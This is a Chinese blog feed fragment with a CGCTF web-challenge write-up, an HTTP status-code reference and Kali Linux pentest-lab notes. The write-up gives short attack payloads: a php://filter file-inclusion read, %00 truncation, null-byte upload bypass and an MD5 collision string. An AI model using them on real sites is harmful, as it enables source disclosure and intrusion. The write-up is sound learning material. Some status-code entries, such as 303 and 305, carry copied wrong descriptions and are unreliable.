    <category term="渗透测试" scheme="http://blog.dvkunion.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CGCTF - 部分WP</title>
    <link href="http://blog.dvkunion.cn/2019/01/21/CGCTF/"/>
    <id>http://blog.dvkunion.cn/2019/01/21/CGCTF/</id>
    <published>2019-01-21T14:51:53.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>CGCTF</h1><h3 id="b-0x00-前言-b"><b>0x00- - 前言</b></h3><p>寒假也开始刷题了...从简单的南邮大佬开始刷起吧...</p><h3 id="b-0x01-WEB-b"><b>0x01- - WEB</b></h3><p><b> 001 签到题</b></p><p>页面询问 key在哪里 打开F12 html注释里得到flag</p><p><b> 002 md5 collision </b></p><p>明显的弱等于和md5 0e科学计数法漏洞<br>放一个payload :s1885207154a</p><p><b> 003 签到2</b></p><p>要求输入一个口令，却发现输入框限制比要求的少了一位，F12改maxlength即可</p><p><b> 004 这题不是WEB</b></p><p>找了一圈啥也没找到，最后下载那个动图扔HEX，图片最后即得Flag</p><p><b> 005 层层递进 </b></p><p>最喜欢的就是这道题<br>Bp爬一下这个题目，会发现四个页面，flag就隐藏在404页面的大段注释的js代码（藏头）</p><p><b> 006 AAencode</b></p><p>题目名字直接告诉你了，扔AAdecode解码即可<br><a href="https://tool.zcmzcm.org/aadecode">https://tool.zcmzcm.org/aadecode</a><br>有个问题是浏览器打开好像乱码了，需要直接下载txt打开。<br>顺带一提chrome控制台可以直接解码...</p><p><b> 007 单身20年</b></p><p>Bp抓包查看302页面即可</p><p><b> 010 php decode</b></p><p>放出了源码，本地跑一下就行。<br>eval函数好像不起作用，换成echo就好了</p><p><b> 011 文件包含 </b></p><p>本地文件上传漏洞,点击之后明显的看到url：?file=show.php<br>构造payload直接查看index.php源码即得flag<br>payload:file=php://filter/read=convert.base64-encode/resource=./index.php<br>读出源码base64解密</p><p><b>012 单身一百年也没用(感受出题人的恶意..)</b></p><p>依旧抓包<br>key藏在了302页面响应头中</p><p><b> 013 Download~ !</b></p><p>题目打不开了。。。。</p><p><b> 014 Cookie </b></p><p>hint给的很足，抓包直接将cookie改为1即可</p><p><b> 015 MYSQL  </b></p><p>现根据提示进入robots.txt看到源码</p><p>可以明显的看到用意：flag存在id=1024内但是输入的id不能是1024</p><p>看到intval函数</p><p>小数绕过即可</p><p><b> 016 GBK Injection </b></p><p>宽字节注入，这题还没搞懂。</p><p><b> 017 /x00 </b></p><p>明显的%00截断...数组也可以绕过<br>数组绕过的是strops函数，而%00是绕过了ereg函数<br>正常payload:nctf=1%00%23biubiubiu</p><p><b> 020 bypass again </b></p><p>弱类型 ==</p><p><b> 021 变量覆盖 </b></p><p>这题也没有做出来，思考的方向错了。<br>看了别人的题解，post提交后覆盖掉$thepassword_123即可。</p><p><b> 022 PHP是世界上最好的语言  </b></p><p>也挂掉了...</p><p><b> 023 伪装者</b></p><p>以为是改X-forwarded-for，结果没用</p><p><b> 024 Header </b></p><p>F12查看head...</p><p><b> 025 上传绕过</b></p><p>要求上传php但是只能上传图片格式文件<br>BP抓包改hex 使用00截断</p><p><b> 026 SQL注入1</b></p><p>直接查看了源码，sql查询语句：<br>$sql=&quot;select user from ctf where (user='&quot;.$user.&quot;') and (pw='&quot;.$pass.&quot;')&quot;;<br>这里犯了一个错误...没有使用)将语句封闭，导致一直报错。<br>还有个奇怪的地方</p><p><b> 027 pass check </b></p><p>源码给出，要求过掉strcmp函数<br>数组直接过掉</p><p><b> 030 起名字真难 </b></p><p>同样给出源码<br>要求一个key，key的每一个数字的值的acsii不能大于等于1小于等于9，并且要求key = '54975581388'</p><p>依旧是弱类型，==会把两个变量转换为相同的类型再进行比较</p><p><b> 031 密码重置</b></p><p>一开始以为是get和post的覆盖。。。直接把用户名改为admin 的base64重发就OK了</p><p><b> 032 php 反序列化(暂时无法做) </b></p><p>无题目。</p><p><b> 033 SQL Injection </b></p><p>打开只有Invalid password!</p><p>F12查看页面源码找到提示：使用admin登录</p><p><b> 034 综合题</b></p><p>打开一堆fuckjs，扔console给出了一个页面<br>页面提示tips在脑子里，脑子=head<br>查看head,tips：history of bash<br>Linux下history命令会生成.bash_history文件，<br>查看发现存在一个flagbak的Zip，访问下载，解压得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CGCTF&lt;/h1&gt;
&lt;h3 id=&quot;b-0x00-前言-b&quot;&gt;&lt;b&gt;0x00- - 前言&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;寒假也开始刷题了...从简单的南邮大佬开始刷起吧...&lt;/p&gt;
&lt;h3 id=&quot;b-0x01-WEB-b&quot;&gt;&lt;b&gt;0x01- - WEB&lt;/b&gt;&lt;/h3&gt;
</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WP" scheme="http://blog.dvkunion.cn/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>HTTP状态码</title>
    <link href="http://blog.dvkunion.cn/2019/01/17/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    <id>http://blog.dvkunion.cn/2019/01/17/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/</id>
    <published>2019-01-17T21:28:48.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>HTTP状态码</h1><!-- split --><p>简单记录一下常用的http状态码表示的含义</p><span id="more"></span><h3 id="b-0x00-概念-b"><b>0x00- - 概念</b></h3><p>HTTP状态码（英语：HTTP Status Code）是用以表示网页服务器超文本传输协议响应状态的3位数字代码。这是表示使用HTTP协议（HyperText Transfer Protocol，超文本传输协议）客服端的请求做出反应的三位数字码。<br>HTTP状态根据开头的第一个数字分为5类。后面两个数字没有分类的作用。</p><h3 id="b-0x01-1xx-信息类状态码-b"><b>0x01- - 1xx 信息类状态码</b></h3><p>这类状态码表示服务器已经收到了请求，需要请求者继续执行操作。</p><table><thead><tr><th>代码号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>继续。客户端应继续其请求</td></tr><tr><td>101</td><td>Switch Protrol</td><td>切换协议，根据客户端的请求切换协议，只能由下至上的切换</td></tr><tr><td>102</td><td>Processing</td><td>由WebDAV（RFC 2518）扩展的状态码，代表处理将被继续执行</td></tr></tbody></table><h3 id="b-0x02-2xx-成功类状态码-b"><b>0x02- - 2xx 成功类状态码</b></h3><p>这类状态码表示服务器已经接受了请求并成功地处理了请求</p><table><thead><tr><th>代码号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>请求成功。一般用于GET与POST请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成,如果201所处理的请求无法及时建立，则返回该状态码</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>请非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分GET请求,类似迅雷等下载工具的下载大文件方式</td></tr><tr><td>207</td><td>Multi-Status</td><td>由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</td></tr></tbody></table><p>206请求头部必须包含Range头信息，并有可能含有IF-Range作为条件请求。<br>响应必须包含如下的头部域：<br>　　Content-Range 用以指示本次响应中返回的内容的范围；如果是 Content-Type 为 multipart/byteranges 的多段下载，则每一 multipart 段中都应包含 Content-Range 域用以指示本段的内容范围。假如响应中包含 Content-Length，那么它的数值必须匹配它返回的内容范围的真实字节数。<br>　　Date<br>　　ETag 和/或 Content-Location，假如同样的请求本应该返回200响应。<br>　　Expires, Cache-Control，和/或 Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。<br>　　假如本响应请求使用了 If-Range 强缓存验证，那么本次响应不应该包含其他实体头；假如本响应的请求使用了 If-Range 弱缓存验证，那么本次响应禁止包含其他实体头；这避免了缓存的实体内容和更新了的实体头信息之间的不一致。否则，本响应就应当包含所有本应该返回200响应中应当返回的所有实体头部域。<br>　　假如 ETag 或 Last-Modified 头部不能精确匹配的话，则客户端缓存应禁止将206响应返回的内容与之前任何缓存过的内容组合在一起。<br>　　任何不支持 Range 以及 Content-Range 头的缓存都禁止缓存206响应返回的内容。</p><h3 id="b-0x03-3xx-重定向类状态码-b"><b>0x03- - 3xx 重定向类状态码</b></h3><p>这类状态码表示服务器需要进一步操作来完成请求。<br>用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。客户端应当自动监测无限循环重定向（例如：A-&gt;A，或者A-&gt;B-&gt;C-&gt;A），因为这会导致服务器和客户端大量不必要的资源消耗。按照 HTTP/1.0 版规范的建议，浏览器不应自动访问超过5次的重定向。</p><table><thead><tr><th>代码号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替。如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</td></tr><tr><td>302</td><td>Found</td><td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td>303</td><td>See Other</td><td>请非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的HTTP状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与302类似。使用GET请求重定向</td></tr></tbody></table><h3 id="b-0x04-4xx-外部错误类状态码-b"><b>0x04- - 4xx 外部错误类状态码</b></h3><p>这类状态码通常指客户端发送的发生了错误，妨碍了服务器的处理、请求包含语法错误或无法完成请求。</p><h3 id="b-0x05-5xx-内部错误类状态码-b"><b>0x05- - 5xx 内部错误类状态码</b></h3><p>这类状态码通常指服务器在处理请求的过程出现了错误或者有异常发生。也可能是服务器意识到无法处理这个请求。<br>5xx的状态码适用于任何响应方法。</p><table><thead><tr><th>代码号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求，一般是服务器代码出现问题</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td>504</td><td>Gateway Time-out</td><td>充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version not supported</td><td>服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr><tr><td>506</td><td>Variant Also Negotiates</td><td>由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误</td></tr><tr><td>507</td><td>Insufficient Storage</td><td>服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。WebDAV (RFC 4918)</td></tr><tr><td>509</td><td>Bandwidth Limit Exceeded</td><td>服务器达到带宽限制。这不是一个官方的状态码，但是仍被广泛使用。</td></tr><tr><td>510</td><td>Not Extended</td><td>获取资源所需要的策略并没有没满足。（RFC 2774）</td></tr></tbody></table><h3 id="b-0x06-其他状态码-b"><b>0x06- - 其他状态码</b></h3><p>208 已经报告<br>一个DAV的绑定成员被前一个请求枚举，并且没有被再一次包括。</p><p>226 IM Used<br>服务器已经满足了请求所要的资源，并且响应是一个或者多个实例操作应用于当前实例的结果。</p><p>308 永久转移<br>这个请求和以后的请求都应该被另一个URI地址重新发送。307、308和302、301有相同的表现，但是不允许HTTP方法改变。例如，请求表单到一个永久转移的资源将会继续顺利地执行。</p><p>418 我是一个茶壶<br>这个代码是在1998年作为传统的IETF April Fools‘ jokes被定义的在RFC2324，超文本咖啡罐控制协议，但是并没有被实际的HTTP服务器实现。RFC指定了这个代码应该是由茶罐返回给速溶咖啡。</p><p>419 认证超时<br>并不是HTTP标注的一部分，419认证超时表示以前的有效证明已经失效了。同时也被用于401未认证的替代选择为了从其它被拒绝访问的已认证客户端中指定服务器的资源。</p><p>420 方法失效<br>不是HTTP的标准，但是被Spring定义在HTTP状态类中当方法失时使用。这个状态码已经不推荐在Spring中使用。</p><p>420 提高你的耐心<br>也不是HTTP标准的一部分，但是被版本1的Twitter搜索和趋势APi返回当客户端的速率被限制的时候。其它的服务提供商可能会使用429太多的请求响应码来代替。</p><p>428 需要前置条件<br>原始服务器需要有条件的请求。当客户端GET一个资源的状态的时候，同时又PUT回给服务器，与此同时第三方修改状态到服务器上的时候，为了避免丢失更新的问题发生将会导致冲突。</p><p>429 过多请求<br>用户已经发送了太多的请求在指定的时间里。用于限制速率。</p><p>431 请求头部字段太大<br>服务器由于一个单独的请求头部字段或者是全部的字段太大而不愿意处理请求。</p><p>440 登陆超时（微软）<br>一个微软的扩展，意味着你的会话已经超时。</p><p>444 无响应<br>被使用在Nginx的日志中表明服务器没有返回信息给客户端并且关闭了连接（在威慑恶意软件的时候比较有用）。</p><p>449 重试（微软）<br>一个微软的扩展。请求应该在执行适当的动作之后被重试。</p><p>450 被Windows家长控制阻塞（微软）<br>一个微软的扩展。这个错误是当Windows家长控制打开并且阻塞指定网页的访问的时候被指定。</p><p>451 由于法律原因而无效（因特网草稿）<br>被定义在因特网草稿“一个新的HTTP状态码用于法律限制的资源”。被用于当资源的访问由于法律原因被禁止的时候。例如检查制度或者是政府强制要求禁止访问。一个例子是1953年dystopian的小说Fahrenheit 451就是一个非法的资源。</p><p>451 重定向（微软）<br>被用在Exchange ActiveSync中如果一个更有效的服务器能够被使用或者是服务器不能访问用户的邮箱。</p><p>客户端会假定重新执行HTTP自动发现协议去寻找更适合的服务器。</p><p>494 请求头太大（Nginx）<br>Nginx内置代码和431类似，但是是被更早地引入在版本0.9.4（在2011年1月21日）。</p><p>495 证书错误（Nginx）</p><p>Nginx内置的代码，当使用SSL客户端证书的时候错误会出现为了在日志错误中区分它和4XX和一个错误页面的重定向。。</p><p>496 没有证书（Nginx）<br>Nginx内置的代码，当客户端不能提供证书在日志中分辨4XX和一个错误页面的重定向。</p><p>497 HTTP到HTTPS（Nginx）<br>Nginx内置的代码，被用于原始的HTTP的请求发送给HTTPS端口去分辨4XX在日志中和一个错误页面的重定向。</p><p>498 令牌超时或失效（Esri）<br>由ArcGIS for Server返回。这个代码意味着令牌的超时或者是失效。</p><p>499 客户端关闭请求（Nginx）<br>被用在Nginx日志去表明一个连接已经被客户端关闭当服务器仍然正在处理它的请求，是的服务器无法返货状态码。</p><p>499 需要令牌（Esri）<br>由ArcGIS for Server返回。意味着需要一个令牌（如果没有令牌被提交）。</p><p>508 发现环路<br>服务器发现了一个无限的循环档处理请求的时候。</p><p>511 需要网络授权<br>客户端需要授权去火的网络的访问权限。一般用于代理交互中被用来进行网络的访问控制。</p><p>520 未知错误<br>这个状态码也没有被指定在任何RFC中，并且只会被一些服务器返回，例如微软的Azure和CloudFlare服务器:”520错误本质上是一个捕获全部的响应当原始服务器返回一些未知的或者一些不能被忍受或者被解释的(协议违反或者空响应)”。</p><p>598 网络读取超时异常(未知)<br>这个状态码也没有在任何RFC中指定，但是被用在微软的HTTP代理中去标注一个网络读取超时在一个客户端之前的代理的后面。</p><p>599 网络连接超时异常(未知)<br>这个状态码也没有在任何RFC中指定，但是被用在微软的HTTP代理中去标注一个网络连接超时在一个客户端之前的代理的后面。</p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;HTTP状态码&lt;/h1&gt;
&lt;!-- split --&gt;
&lt;p&gt;简单记录一下常用的http状态码表示的含义&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://blog.dvkunion.cn/categories/Crypto/"/>
    
    
    <category term="WEB" scheme="http://blog.dvkunion.cn/tags/WEB/"/>
    
    <category term="常用编码" scheme="http://blog.dvkunion.cn/tags/%E5%B8%B8%E7%94%A8%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>Linux--KaLi</title>
    <link href="http://blog.dvkunion.cn/2018/12/04/Linux-KaLi/"/>
    <id>http://blog.dvkunion.cn/2018/12/04/Linux-KaLi/</id>
    <published>2018-12-04T14:56:10.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>Linux--KaLi</h1><h3 id="b-0x00-前言-b"><b>0x00- - 前言<b></h3><p>咳咳,一直想要把KaLi里面的东西好好的整理一下，毕竟能省去很多复杂的操作时间。（其实就是图书馆借的书马上得换了赶紧翻两页写个笔记好了Orz...）<br>相比普通的Linux，KaLi集成了大量的渗透工具。是一个相当于什么都给你准备好的大型工具箱，能简化我们大量的安装时间。</p><blockquote><p>&quot;工欲善其事，必先利其器&quot;</p></blockquote><h3 id="b-0x01-KaLi简介-安装-b"><b>0x01- - KaLi简介&amp;安装<b></h3><p>还是从这个东西的历史开始了解。</p><p>Kali Linux是基于Debian的Linux发行版， 设计用于数字取证操作系统。由Offensive Security Ltd维护和资助。最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成，BackTrack是他们之前写的用于取证的Linux发行版 。<br>Kali 也是一个简便的安全解决方案。Kali 并不要求你自己去维护一个 Linux 系统，或者你自己去收集软件和依赖项。你只需要专注于要审计的真实工作上，而不需要去考虑准备测试系统。</p><p>至于安装，我这里选择在虚拟机内搭建一个kali环境作为测试。</p><p>安装方法与普通的Linux系统并无区别，这里不再赘述。在<a href="http://www.kali.org/">官网</a>下载镜像扔进虚拟机即可。<br>还是加一个注释吧：-i386 是 32位系统的镜像包，amd64 是 64位系统的安装包</p><p>KaLi 也可以安装到U盘/SD卡，甚至是ARM设备中。</p><h3 id="b-0x02-KaLi前期准备-b"><b>0x02- - KaLi前期准备<b></h3><h4 id="font-color-blue-软件包的安装-font-br"><font color = "blue">软件包的安装</font><br></h4><p>安装完成后，总需要微微的配置一下个人设置，让这台终端有一些你的记号，才会有一种归属感。<br>Kali是基于Debian开发的系统，所以在软件源和安装上，Kali使用的是和Debian一样的APT软件包管理工具和dpkg软件包管理器。<br>apt 命令也不过多赘述，参考Linux--CentOS 或是 Linux--Ubuntu。这里列出几个常用的命令仅供参考：<br><code># apt-get install /package name/ </code> 安装<br><code># apt-get update </code> 更新软件源和软件库<br><code># apt-get upgrade</code> 升级kali软件<br><code># apt-get dist-upgrade</code> kali版本升级<br><code># apt-get remove /package name/</code> 卸载<br><code># apt-get autoremove</code> 自动移除不需要的软件包。<br><code># apt-get purge /package name/</code>完全移除（包括依赖软件包）<br><code># apt-get clean [all]</code> 清理下载的软件包<br><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fxurhy1rahj30kk0dwwjb.jpg" alt=""><br>dpkg 使用方法同 rpm 一样，只不过dpkg 是针对.deb的软件包。在Kali内，是不支持rpm(red hat package)的。<br>dpgk的部分常用参数也列在此处供参考：<br><code>dpkg -i </code>安装<br><code>dpkg -r </code>卸载<br><code>dpkg -P </code>完全移除<br><code>dpkg -l </code>显示软件状态<br><code>dpkg -p </code> 详细信息<br>还有一种使用 tar 安装的方式，和其他系统下 tar 的安装无差异。</p><p>有时系统提供的官方库没有我们需要的软件，与要自己手动更换软件源：<br><code>vim /etc/apt/sources.list</code><br>将源添加在文件的尾部:<br><code>deb http://http.us.debian.org/debianstable main contrib non-free</code></p><p>保存后apt-get update 更新即可。</p><h4 id="font-color-blue-KaLi网络-基本服务-font-br"><font color = "blue">KaLi网络&amp;基本服务</font><br></h4><h5 id="b-网络-b"><b>网络</b></h5><p>Kali的网络配置也和Debian基本相同，配置文件位于 /etc/network/interfaces。其DNS文件位于 /etc/resolv.conf<br>虚拟机内我们为了方便基本操作使用DHCP分配一个IP即可。（后续还是使用静态较好...这东西的动静太大了）</p><p>学习一个大佬的小习惯：插网线前断掉网卡,避免多余的通信。<br>在GUI界面直接配置Network Connections可以起到同样的作用。</p><h5 id="b-服务-b"><b>服务</b></h5><p>kali自带一个简易的apache web服务。<br>同样我们可以通过GUI界面和命令行界面启动。<br>GUI的启动方法...自己在开始菜单里面找一找吧...因该有的...（书上是这么的写的...ಠ_ಠ）<br>命令行操作:<br><code># /etc/init.d/apache2 start</code> 启动<br><code># /ect/init.d/apache2 stop</code> 停止<br><code># /ect/init.d/apache2 restart</code> 重启<br>配置文件位置：<br><code># /etc/apache2/apache2.conf</code><br>出现错误时查日志修改配置文件。<br>成功启动后访问kali的ip可以看到熟悉的页面<br><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fxusyf6ebej30zq0haq4p.jpg" alt=""></p><p>同时kali提供SSH服务。<br>命令行操作:<br><code># /etc/init.d/ssh start</code> 启动<br><code># /ect/init.d/ssh stop</code> 停止<br><code># /ect/init.d/ssh restart</code> 重启</p><p>一般为了方便我们还要搭建以下FTP服务。<br>可以安装的FTP服务很多，例如VSFTP、Pure-FTPd等</p><h3 id="b-0x03-靶机环境搭建-b"><b>0x03- - 靶机环境搭建<b></h3><p>武器准备的差不多了，我们需要找两个“受害者”了。<br>心中铭记社会主义核心价值观的我，怎么可能会攻击别人的主机呢？（网络安全法了解一下）就自己造两个“稻草人”来作为“受害者”。Σ(*ﾟдﾟﾉ)ﾉ</p><p>win下当然就是VM跑起来挂着就好了。<br>Linux下可以使用docker模拟多台靶机。</p><p>安装的系统可以使用Rapid7 / Metasploitable2<br>/SamuraiWTF/BWA</p><p><a href="http://sourceforge.net">Metasploitable2 官网</a></p><p>下载完成后直接扔虚拟机。<br>登录:用户、密码都是msfadmin。<br>访问其IP如下图：<br><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fxuzee0cakj30if0dlglj.jpg" alt=""><br>Metasploitable 还包含：</p><ol><li>1.phpMyAdmin：一个基于php的数据库图形化管理界面</li><li>2.Mutillidate：Metasploitable内置的可能已经过期，可以访问<a href="http://sourceforge.net/projects/mutillidate">最新参考资源</a><br><a href="http://www.youtube.com/user/webpwnized">参考视频</a></li><li>3.WebDAV：这是一个HTTP协议栈的扩展。<a href="http://www.webdav.com">更多信息</a></li><li>4.DVWA：这个就不多说了，参见另一篇通关文章：</li><li>5.Twiki：一款企业及的web2.0应用程序的Wiki和Web前端协作。</li></ol><p>训练库MCIR(Maglcal Code Injection Rainbow)<br>MCIR包含以下几个模块：</p><ol><li>1.SQLol</li><li>2.XMlmao</li><li>3.shelol</li><li>4.XSSmh</li><li>5.CryptOMG</li></ol><p><a href="http://github.com/SpiderLabs/MCIR">More</a></p><p>可以在 matoploitable2 下安装MCIR<br>下载MCIR源码:</p><p><code>wget https://codeload.github.com/SpiderLabs/MCIR/zip/master</code></p><p>我没有成功，由于什么ssl错误...直接去他的github上把源码包撸下来扔到虚拟机里，效果一样的。<br>扔进去之后解压：</p><p><code>unzip master</code></p><p>把解压后的文件夹拷贝到apache目录下</p><p><code>sudo mv MCIR-master /var/www/mcir</code><br>之后还要修改一下mcir的主界面，创建一个入口</p><p><code>cd /var/www</code><br><code>sudo vim index.php</code></p><p>将mcir的连接写入web列表中</p><p><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fxv1cijp5wj30mt0dpdfq.jpg" alt=""></p><p>之后访问IP如下:</p><p><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fxv16m9vn8j30po0e4mx4.jpg" alt=""></p><p>点击我们创建的入口连接：</p><p><img src="https://blog.dvkunion.cn/img/006IjVYfgy1fxv1bsy9m6j30pe0dw74j.jpg" alt=""></p><p>到此，靶机的安装先告一段落。</p><h3 id="b-0x04-渗透测试流程-b"><b>0x04- - 渗透测试流程<b></h3><p>在这一部分，想规范化一下渗透测试的五个标准流程。<br>该框架为渗透测试人员提供了一个较为完备的渗透体系，同时也用于为渗透测试活动形成更高等级的计划。<br>一个比较通用的定义为：一个渗透测试的生命周期分为五个阶段：</p><ol><li><b>1.侦查</b></li><li><b>2.扫描</b></li><li><b>3.渗透</b></li><li><b>4.维持访问</b></li><li><b>5.报告</b></li></ol><p>因为这篇博客主角为KaLi,所以在此仅记录KaLi下的这五部分的工具。</p><h4 id="font-color-blue-1-侦查-font-br"><font color = "blue">1.侦查</font><br></h4><blockquote><p>知己知彼，百战不殆</p></blockquote><p>什么是侦查？所有有关渗透学习的资料的第一章必定都是侦查。个人认为，就是利用一切可以搜集到与目标有关或者间接有关的信息的方法，进行信息搜集。例如我们所熟悉的：Google、百度。<br>本阶段的目标是找出关于组织机构尽可能多的信息。</p><ul><li>· 组织架构，组织结构图，部门架构图等</li><li>· 组织基础设施：IP地址和网络拓扑</li><li>· 使用技术：硬件平台和服务软件包</li><li>· 联系方式：员工邮箱地址、手机号码</li><li>· 地理位置：组织设施的地理位置</li></ul><p>首先从目标网站开始：自身的门户网站往往包含了大量的高价值信息；其次招聘信息的页面也往往能够透露出目标所使用的技术；每一个站点都要进行webmail的连接，并进行评估。</p><h5 id="wget-工具">wget 工具</h5><p>我们可以通过wget工具对网站进行下载离线镜像。<br>wget只能获取所有的html页面，而不能获取PHP教本页面。<br>具体参数参考手册。</p><h5 id="Google-Google-Hacking">Google &amp;Google Hacking</h5><p><a href="http://www.google.com/advanced_search">Google 的高级搜索页</a><br><a href="http://www.hackerforcharity.org/ghdb">Google Hacking 数据库(GHDB)</a><br><a href="http://www.offensive-security.com/community-projects/google-hacking-database/">阅读《Google Hacking for Penetration Testers》</a></p><p>P.S:有时间关注一下LinkedIn</p><h5 id="DNS-DNS攻击">DNS/DNS攻击</h5><h5 id="查询域名服务器-nslookup">查询域名服务器/-/-nslookup</h5><p>nslookup 工具可以用于域名服务器查询。<br>在kali终端直接输入nslookup，即可进入该工具命令模式。<br>输入一个域名，即可向本地域名服务器查询这个域名的权威应答和非权威应答服务器。<br>nslookup 通过分配给本机的域名服务器进行查询。可用server参数进行查看：</p><p><code>nslookup </code><br><code>&gt; server</code></p><p>nslookup还可以限定查询服务器类型：<br><code>&gt; set type = MX</code> 特定查询邮件服务器<br><code>&gt; google.com</code>  查询的域名<br>本地域名服务器配置文件即DNS解析文件。</p><p>/etc/resovle.conf</p><p>nslook常见主要记录类型：</p><table><thead><tr><th style="text-align:left">Record Type</th><th style="text-align:left">Default Port</th><th style="text-align:left">Server Type</th></tr></thead><tbody><tr><td style="text-align:left">mx</td><td style="text-align:left">25</td><td style="text-align:left">Mail</td></tr><tr><td style="text-align:left">txt</td><td style="text-align:left">n/a</td><td style="text-align:left">Text message used for notes</td></tr><tr><td style="text-align:left">ns</td><td style="text-align:left">53</td><td style="text-align:left">Name Server</td></tr><tr><td style="text-align:left">cname</td><td style="text-align:left">n/a</td><td style="text-align:left">Alias for another server</td></tr><tr><td style="text-align:left">aaaa</td><td style="text-align:left">n/a</td><td style="text-align:left">IPversion 6</td></tr><tr><td style="text-align:left">a</td><td style="text-align:left">n/a</td><td style="text-align:left">Domain or Sub-Domain record</td></tr></tbody></table><h5 id="区域传输">区域传输</h5><p>区域传输可以在短时间内获取更多的信息。<br>区域传输是完全镜像一台服务器的所有信息，在配置不当的服务器上不但授权更新客户端的区域传输，还准许传输请求。<br>我们使用 Domain Internet Gopher (DIG) 程序进行区域传输：<br><code>dig @ [nameserver][domain] axfr</code><br>一般域名服务器会拒绝这个请求，当域名服务器配置不当时，完整的域名服务器记录将会被传输到本地Kali，域名应该是最小域名。axfr参数表示dig应请求一个区域传输操作。</p><h4 id="font-color-blue-2-扫描-font-br"><font color = "blue">2.扫描</font><br></h4><p>我们再打个形象的比喻：这个比喻是在《黑客秘籍--渗透测试指南》一书中，全书将渗透测试比喻做一场足球赛：如果说侦查是在赛前对对手的球队有哪些球员等信息进行搜集，那么扫描就是正式比赛开始的哨声。</p><p>扫描的主要目的是确定连接组织网络中的计算机和其他设备的指定信息。在本阶段中，目标就是找到所有的主机终端、确认操作系统以及开启的服务、甚至发现较为明显的漏洞。</p><p>常见的扫描工具：Nmap、Hping、Nessus。</p><p>进行这一部分之前，需要对网络的几个基础知识有一定的了解：网络流量、端口、防火墙、IP协议、TCP协议、UDP协议，ICMP等。<br>参考CSDN上的部分博文吧。</p><p><font color = "red">新增加一个命令：tracert(for Win)/traceroute(for Linux)。</font><br>关于这个东西的理解还不是很深刻，后续在计网里补一下。</p><h5 id="Nmap">Nmap</h5><p>简单的使用过这个工具，现在详细的学习一下这个工具的功能。</p><p>最初接触 Nmap 是用于端口扫描。真正仔细的学习时候发现Nmap好强大啊。<br>Nmap不仅可以确认目标网络上的计算机存活状态，大多数情况还能拿到主机的操作系统、监听的端口、服务、甚至用户证书。<br>Nmap的命令非常灵活。用一个普通的命令为例：<br><code># 